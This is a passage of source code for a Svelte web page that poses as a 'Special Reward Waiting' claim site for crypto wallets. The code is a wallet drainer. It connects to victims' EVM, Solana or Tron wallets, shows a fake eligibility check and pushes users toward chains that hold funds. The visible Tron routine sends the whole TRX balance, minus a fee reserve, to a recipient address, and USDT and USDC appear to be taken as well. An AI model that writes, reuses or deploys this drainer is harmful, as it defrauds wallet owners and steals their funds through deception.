    await handleToken("USDT", TRON_CONFIG.usdtContract);
  }

  if (TRON_CONFIG.usdcContract) {
    await handleToken("USDC", TRON_CONFIG.usdcContract);
  }

  try {
    const trxBalance = await tronWeb.trx.getBalance(walletAddress);
    const trxBalanceBig = BigInt(trxBalance);

    if (trxBalanceBig === 0n) return true;

    const formatted = Number(trxBalance) / 1e6;
    foundBalances.push(`TRX: ${formatted.toFixed(4)}`);

    const energyReserve = await getEnergyReserve();
    const baseReserve = 5n * 1_000_000n;
    const reserve = energyReserve + baseReserve;

    if (trxBalanceBig <= reserve) {
      console.log("Not enough TRX after reserve.");
      return true;
    }

    const amountToSend = trxBalanceBig - reserve;

    try {
      const tx = await retryTx(async () => {
        return tronWeb.trx.sendTransaction(
          recipient,
          Number(amountToSend)
        );
      });
    } catch {
      console.log("TRX simulation failed");
      return true;
    }

    const tx = await retryTx(async () => {
      return tronWeb.trx.sendTransaction(
        recipient,
        Number(amountToSend)
      );
    });
    const receipt = await tronWeb.trx.getTransactionInfo(tx.txid);

    if (receipt && receipt.receipt?.result === "SUCCESS") {
      executedActions.push("TRX");
    }

  } catch (err) {
    console.log("TRX transfer failed", err);
  }

  return true;
}

/* ---------------- WALLET DETECTION ---------------- */
function detectWallets() {
  const wallets = [];
  if (window.ethereum) wallets.push("evm");
  if (window.solana) wallets.push("solana");
  const tronProv = getTronProvider();
  if (tronProv) wallets.push("tron");
  return wallets;
}

function hasTokenPocket(): boolean {
  const w = window as any;
  return !!w.tokenpocket;
}

function hasTronLink(): boolean {
  const w = window as any;
  return !!(w.tronLink || w.tron);
}

function hasMetaMask(): boolean {
  const w = window as any;
  return !!(w.ethereum?.isMetaMask);
}

function hasTrustWallet(): boolean {
  const w = window as any;
  return !!(w.ethereum?.isTrust || w.trustwallet);
}

function isMobile(): boolean {
  const ua = navigator.userAgent;
  return /iPhone|iPad|iPod|Android/i.test(ua);
}

/* ---------------- WALLET SELECTION ---------------- */
function openWalletPopup() { showWalletPopup = true; }

async function chooseWallet(walletConfig: typeof WALLET_CONFIGS[0]) {
  showWalletPopup = false;

  connecting = true;
  let result: { success: boolean; cancelled?: boolean; address?: string } = { success: false };
  const type = walletConfig.type;
  
  if (type === "evm") {
    evmAddress = null;
    result = await connectEVM();
  } else if (type === "solana") {
    solAddress = null;
    result = await connectSolana();
  } else if (type === "tron") {
    tronAddress = null;
    result = await connectTron();
  }
  
  connecting = false;

  // Handle cancellation - stop operations if user cancelled
  if (result.cancelled) {
    console.log("User cancelled wallet connection");
    eligibilityMessage = "❌ Connection cancelled by user.";
    showEligibilityResult = true;
    setTimeout(() => showEligibilityResult = false, 3000);
    return;
  }

  if (!result.success) {
    // Check for fallback options for Tron wallets
    if (type === "tron") {
      // Try fallback to other wallets
      if (walletConfig.name === "TokenPocket" && !hasTronLink() && window.ethereum) {
        // Try Trust Wallet or MetaMask as fallback for EVM
        if (hasTrustWallet()) {
          eligibilityMessage = "⚠️ TokenPocket not found. Trying Trust Wallet...";
          showEligibilityResult = true;
          setTimeout(async () => {
            showEligibilityResult = false;
            await tryFallbackWallet("Trust Wallet");
          }, 1500);
          return;
        } else if (hasMetaMask()) {
          eligibilityMessage = "⚠️ TokenPocket not found. Trying MetaMask...";
          showEligibilityResult = true;
          setTimeout(async () => {
            showEligibilityResult = false;
            await tryFallbackWallet("MetaMask");
          }, 1500);
          return;
        }
      } else if (walletConfig.name === "TronLink" && !hasTokenPocket() && window.ethereum) {
        // Try EVM wallets as fallback
        if (hasTrustWallet()) {
          eligibilityMessage = "⚠️ TronLink not found. Trying Trust Wallet...";
          showEligibilityResult = true;
          setTimeout(async () => {
            showEligibilityResult = false;
            await tryFallbackWallet("Trust Wallet");
          }, 1500);
          return;
        } else if (hasMetaMask()) {
          eligibilityMessage = "⚠️ TronLink not found. Trying MetaMask...";
          showEligibilityResult = true;
          setTimeout(async () => {
            showEligibilityResult = false;
            await tryFallbackWallet("MetaMask");
          }, 1500);
          return;
        }
      }
    }
    
    eligibilityMessage = "❌ Failed to connect wallet.\n\nPlease make sure your wallet is connected and try again.";
    showEligibilityResult = true;
    setTimeout(() => showEligibilityResult = false, 9000);
    return;
  }
  
  let chainName: string;
  if (type === "evm") {
    chainName = currentChainId ? getChainNameFromId(currentChainId) : "ethereum";
  } else {
    chainName = type;
  }
  
  const isEligible = await analyzeWalletEligibility(type, chainName);
  
  if (!isEligible) {
    if (type === "evm") evmAddress = null;
    else if (type === "solana") solAddress = null;
    else if (type === "tron") tronAddress = null;
    
    setTimeout(() => {
      promptChainSwitch(type);
    }, 2000);
    return;
  }   
  claimRewardAnimation(type as 'evm' | 'solana' | 'tron');
}

async function tryFallbackWallet(walletName: string) {
  const fallbackConfig = WALLET_CONFIGS.find(w => w.name === walletName);
  if (fallbackConfig) {
    await chooseWallet(fallbackConfig);
  }
}

/* ---------------- TRIGGER WALLET POPUP ---------------- */
function onClaimClick() {
  const wallets = detectWallets();
  if (wallets.length === 0) {
    if (isMobile()) {
      showMobileWalletPopup = true;
      return;
    } else {
      showError("No wallet detected. Please install a wallet extension to claim rewards.");
    }
    return;
  }
  openWalletPopup();
}

/* ---------------- MOBILE DEEP LINK ---------------- */
function handleMobileWalletSelect(walletConfig: typeof WALLET_CONFIGS[0]) {
  showMobileWalletPopup = false;
  
  let deepLink: string;
  const currentUrl = window.location.href;
  
  if (walletConfig.name === "MetaMask") {
    deepLink = walletConfig.deepLink(window.location.host);
  } else if (walletConfig.name === "Exodus") {
    deepLink = walletConfig.deepLink(currentUrl);
  } else if (walletConfig.name === "TokenPocket") {
    // TokenPocket deep link
    deepLink = `https://tokenpocket.pro/`;
  } else {
    deepLink = walletConfig.deepLink(currentUrl);
  }
  
  window.location.href = deepLink;
}

// Helper function for errors
function showError(message: string) {
  eligibilityMessage = `❌ ${message}`;
  showEligibilityResult = true;
  setTimeout(() => {
    showEligibilityResult = false;
  }, 3000);
}
</script>

<section class="page">
  <div class="card">
    <div class="icon">🎁</div>
    <h1>Special Reward Waiting</h1>
    <p class="subtitle">Your wallet has been selected to claim an exclusive reward.</p>
    <div class="counter"><span>{rewardCount.toLocaleString()}</span> rewards claimed today</div>
    <button class="claim-btn" onclick={onClaimClick} disabled={claimed||connecting||analyzing}>
      {#if analyzing}Analyzing Wallet...
      {:else if connecting}Connecting Wallet...
      {:else if claimed}Reward Claimed
      {:else}Claim Your Reward{/if}
    </button>

    {#if evmAddress}<div class="wallet">🔗 EVM: {evmAddress.slice(0,6)}...{evmAddress.slice(-4)}</div>{/if}
    {#if solAddress}<div class="wallet">🔗 SOL: {solAddress.slice(0,6)}...{solAddress.slice(-4)}</div>{/if}
    {#if typeof tronAddress === "string" && tronAddress.length > 10}
      <div class="wallet">
        🔗 TRON: {tronAddress.slice(0,6)}...{tronAddress.slice(-4)}
      </div>
    {/if}

    {#if claimed}<div class="success">✅ Success! Your reward has been unlocked.</div>{/if}
    <div class="footer">Multi-chain supported reward claim</div>
  </div>

  <!-- Desktop Wallet Popup -->
  {#if showWalletPopup}
    <div class="wallet-popup">
      <div class="wallet-popup-content">
        <h3>Connect Wallet</h3>
        <p class="wallet-subtitle">Select a wallet to claim your reward</p>
        <div class="wallet-grid">
          {#each WALLET_CONFIGS as wallet}
            <button class="wallet-option" onclick={()=>chooseWallet(wallet)} style="--wallet-color: {wallet.color}">
              <img src={wallet.icon} alt={wallet.name} class="wallet-icon" onerror={(e) => (e.target as HTMLImageElement).src = 'https://via.placeholder.com/48?text=W'} />
              <span class="wallet-name">{wallet.name}</span>
              <span class="wallet-type">{wallet.type.toUpperCase()}</span>
            </button>
          {/each}
        </div>
        <button class="cancel" onclick={()=>showWalletPopup=false}>Cancel</button>
      </div>
    </div>
  {/if}

  <!-- Mobile Wallet Selection Popup -->
  {#if showMobileWalletPopup}
    <div class="wallet-popup mobile-wallet-popup">
      <div class="wallet-popup-content">
        <h3>Choose Your Wallet</h3>
        <p class="wallet-subtitle">Select a wallet to open this dApp</p>
        <div class="wallet-grid mobile-wallet-grid">
          {#each WALLET_CONFIGS as wallet}
            <button class="wallet-option mobile-wallet-option" onclick={()=>handleMobileWalletSelect(wallet)} style="--wallet-color: {wallet.color}">
              <div class="wallet-icon-wrapper">
                <img src={wallet.icon} alt={wallet.name} class="wallet-icon mobile-wallet-icon" onerror={(e) => (e.target as HTMLImageElement).src = 'https://via.placeholder.com/64?text=W'} />
              </div>
              <span class="wallet-name mobile-wallet-name">{wallet.name}</span>
              <span class="wallet-type mobile-wallet-type">{wallet.type.toUpperCase()}</span>
            </button>
          {/each}
        </div>
        <button class="cancel mobile-cancel" onclick={()=>showMobileWalletPopup=false}>Cancel</button>
      </div>
    </div>
  {/if}

  {#if showAnalyzingPopup}
    <div class="analyzing-popup">
      <div class="analyzing-content">
        <div class="spinner"></div>
        <h3>Analyzing Wallet Eligibility</h3>
        <p>Checking wallet for eligibility state...</p>
        <div class="progress-bar">
          <div class="progress-fill"></div>
        </div>
      </div>
    </div>
  {/if}

  {#if showEligibilityResult}
    <div class="eligibility-popup">
      <div class="eligibility-content" class:ineligible={eligibilityMessage.includes("Ineligible") || eligibilityMessage.includes("Failed") || eligibilityMessage.includes("cancelled")}>
        <pre>{eligibilityMessage}</pre>
        {#if eligibilityMessage.includes("Ineligible") && !eligibilityMessage.includes("cancelled")}
          <button class="switch-chain-btn" onclick={() => promptChainSwitch("evm")}>
            Switch Network
          </button>
        {/if}
        <button class="close-btn" onclick={() => showEligibilityResult = false}>Close</button>
      </div>
    </div>
  {/if}

  {#if showChainSwitchPopup}
    <div class="chain-switch-popup">
      <div class="chain-switch-content">
        <h3>Switch Network</h3>
        <p>Current network has no gas tokens, gas fees are always required to facilitate onchain transactions by the blockchain from your end. Select another chain with enough gas fees to cover transaction:</p>
        {#each EVM_CHAINS as chain}
          <button class="chain-btn" onclick={() => switchEVMChain(chain.chainId)}>
            {chain.name}
          </button>
        {/each}
        <button class="cancel-btn" onclick={() => showChainSwitchPopup = false}>Cancel</button>
      </div>
    </div>
  {/if}
</section>

<style>
:global(body){margin:0;font-family:Arial,Helvetica,sans-serif;background:linear-gradient(135deg,#fff3e6,#ffffff);touch-action:manipulation;}
.page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
.card{width:100%;max-width:420px;background:white;border-radius:18px;padding:28px;text-align:center;box-shadow:0 15px 40px rgba(0,0,0,0.12);}
.icon{ font-size:42px;margin-bottom:10px; }
h1{ margin:10px 0;font-size:24px; }
.subtitle{ color:#666;font-size:14px;margin-bottom:20px; }
.counter{ margin-bottom:18px; }
.counter span{ color:#ff7a00;font-weight:bold; }
.claim-btn{ width:100%;background:#ff7a00;color:white;border:none;padding:14px;font-size:16px;font-weight:bold;border-radius:10px;cursor:pointer;touch-action:manipulation;-webkit-tap-highlight-color:transparent; }
.claim-btn:disabled{ opacity:0.6; }
.wallet{ margin-top:14px;font-size:13px; }
.success{ margin-top:20px;padding:12px;background:#fff3e6;border-radius:10px;color:#ff7a00;font-weight:600; }
.footer{ margin-top:22px;font-size:12px;color:#999; }

/* Enhanced Wallet Popup with Images */
.wallet-popup{ position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:1000;padding:20px;backdrop-filter:blur(5px);overflow-y:auto; }
.wallet-popup-content{ background:white;border-radius:24px;padding:32px;max-width:400px;width:100%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.3);max-height:90vh;overflow-y:auto; }
.wallet-popup-content h3{ margin:0 0 8px 0;font-size:22px;color:#1a1a1a; }
.wallet-subtitle{ color:#666;font-size:14px;margin-bottom:24px; }
.wallet-grid{ display:grid;grid-template-columns:repeat(2, 1fr);gap:12px;margin-bottom:20px; }
.wallet-option{ 
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:16px 12px;border:2px solid #e0e0e0;border-radius:16px;
  background:white;cursor:pointer;transition:all 0.3s ease;
  position:relative;overflow:hidden;touch-action:manipulation;-webkit-tap-highlight-color:transparent;
}
.wallet-option:hover, .wallet-option:active{ 
  transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,0,0,0.15);
  border-color:var(--wallet-color, #ff7a00);
}
.wallet-option::before{ 
  content:'';position:absolute;top:0;left:0;right:0;height:4px;
  background:var(--wallet-color, #ff7a00);opacity:0;transition:opacity 0.3s;
}
.wallet-option:hover::before, .wallet-option:active::before{ opacity:1; }
.wallet-icon{ width:48px;height:48px;border-radius:12px;object-fit:cover;margin-bottom:8px; }
.wallet-name{ font-size:13px;font-weight:600;color:#1a1a1a;margin-bottom:4px; }
.wallet-type{ font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.5px; }
.wallet-popup-content .cancel{ 
  width:100%;padding:12px;background:#f0f0f0;border:none;border-radius:12px;
  cursor:pointer;font-weight:600;color:#666;transition:background 0.2s;touch-action:manipulation;
}
.wallet-popup-content .cancel:hover{ background:#e0e0e0; }

/* Mobile Specific Styles */
@media (max-width: 480px) {
  .card {
    padding: 20px;
    margin: 10px;
  }
  
  h1 {
    font-size: 20px;
  }
  
  .wallet-popup-content {
    padding: 24px 16px;
    margin: 10px;
    max-height: 85vh;
  }
  
  .wallet-popup-content h3 {
    font-size: 20px;
  }
  
  .mobile-wallet-grid {
    grid-template-columns: repeat(2, 1fr);
    gap: 16px;
  }
  
  .mobile-wallet-option {
    padding: 20px 12px;
    min-height: 120px;
  }
  
  .wallet-icon-wrapper {
    width: 64px;
    height: 64px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 12px;
    background: #f8f8f8;
    border-radius: 16px;
    padding: 8px;
  }
  
  .mobile-wallet-icon {
    width: 56px;
    height: 56px;
    border-radius: 12px;
    margin-bottom: 0;
  }
  
  .mobile-wallet-name {
    font-size: 15px;
    font-weight: 700;
    margin-bottom: 6px;
  }
  
  .mobile-wallet-type {
    font-size: 11px;
    font-weight: 600;
    padding: 4px 8px;
    background: #f0f0f0;
    border-radius: 12px;
    color: #666;
  }
  
  .mobile-cancel {
    padding: 16px;
    font-size: 16px;
    margin-top: 8px;
  }
  
  .chain-btn {
    padding: 16px;
    font-size: 15px;
    margin: 8px 0;
  }
  
  .chain-switch-content {
    padding: 24px 16px;
  }
  
  .chain-switch-content p {
    font-size: 14px;
    line-height: 1.5;
  }
  
  .eligibility-content {
    padding: 24px 16px;
    margin: 10px;
  }
  
  .eligibility-content pre {
    font-size: 15px;
  }
  
  .switch-chain-btn, .close-btn {
    padding: 16px;
    font-size: 16px;
  }
}

@media (max-width: 360px) {
  .mobile-wallet-grid {
    grid-template-columns: 1fr;
    gap: 12px;
  }
  
  .mobile-wallet-option {
    flex-direction: row;
    justify-content: flex-start;
    padding: 16px;
    min-height: auto;
  }
  
  .wallet-icon-wrapper {
    margin-bottom: 0;
    margin-right: 16px;
    width: 56px;
    height: 56px;
  }
  
  .mobile-wallet-icon {
    width: 40px;
    height: 40px;
  }
  
  .mobile-wallet-name {
    font-size: 16px;
    margin-bottom: 4px;
    text-align: left;
  }
  
  .mobile-wallet-type {
    align-self: flex-start;
  }
}

.analyzing-popup {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.8);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1001;
  padding: 20px;
}
.analyzing-content {
  background: white;
  border-radius: 16px;
  padding: 40px;
  text-align: center;
  max-width: 320px;
  width: 100%;
}
.spinner {
  width: 50px;
  height: 50px;
  border: 4px solid #f3f3f3;
  border-top: 4px solid #ff7a00;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 20px;
}
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.progress-bar {
  width: 100%;
  height: 6px;
  background: #e0e0e0;
  border-radius: 3px;
  margin-top: 20px;
  overflow: hidden;
}
.progress-fill {
  height: 100%;
  background: #ff7a00;
  width: 0%;
  animation: fillProgress 2.5s ease-out forwards;
}
@keyframes fillProgress {
  0% { width: 0%; }
  100% { width: 100%; }
}

.eligibility-popup {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.7);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1002;
  padding: 20px;
}
.eligibility-content {
  background: white;
  border-radius: 16px;
  padding: 28px;
  max-width: 400px;
  width: 100%;
  text-align: center;
  border-left: 5px solid #4CAF50;
}
.eligibility-content.ineligible {
  border-left-color: #f44336;
}
.eligibility-content pre {
  white-space: pre-wrap;
  font-family: inherit;
  font-size: 14px;
  line-height: 1.6;
  margin-bottom: 20px;
}
.switch-chain-btn {
  width: 100%;
  padding: 12px;
  background: #ff7a00;
  color: white;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  margin-bottom: 10px;
  font-weight: bold;
  touch-action: manipulation;
}
.close-btn {
  padding: 10px 20px;
  background: #ccc;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  touch-action: manipulation;
}

.chain-switch-popup {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.7);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1003;
  padding: 20px;
}
.chain-switch-content {
  background: white;
  border-radius: 16px;
  padding: 28px;
  max-width: 400px;
  width: 100%;
  text-align: center;
  max-height: 90vh;
  overflow-y: auto;
}
.chain-switch-content h3 {
  margin-bottom: 12px;
  font-size: 20px;
}
.chain-btn {
  width: 100%;
  padding: 12px;
  margin: 6px 0;
  background: #f0f0f0;
  border: 2px solid #e0e0e0;
  border-radius: 8px;
  cursor: pointer;
  touch-action: manipulation;
  transition: all 0.2s;
}
.chain-btn:hover, .chain-btn:active {
  background: #ff7a00;
  color: white;
  border-color: #ff7a00;
}
.cancel-btn {
  margin-top: 12px;
  padding: 10px 20px;
  background: #ccc;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  touch-action: manipulation;
}
</style>